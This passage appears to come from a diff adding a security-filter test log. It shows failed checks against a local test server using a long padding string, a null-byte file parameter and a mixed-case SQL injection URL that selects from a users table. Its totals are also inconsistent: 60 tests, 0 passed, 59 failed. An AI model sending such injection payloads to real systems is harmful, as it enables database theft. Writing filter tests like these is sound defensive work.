aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: Edge Case: Null byte in parameter
+  URL: http://test.lock:8000/?file=test%00.txt
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: Edge Case: Mixed case SQL
+  URL: http://test.lock:8000/?id=1' UnIoN SeLeCt * FrOm users--
+  Method: GET
+  HTTP Code: 000
+✗ FAIL: Expected block but got HTTP 000
+
+=====================================
+TEST SUMMARY
+=====================================
+Total Tests: 60
+Passed: 0
+Failed: 59
+Blocked (Security Working): 0
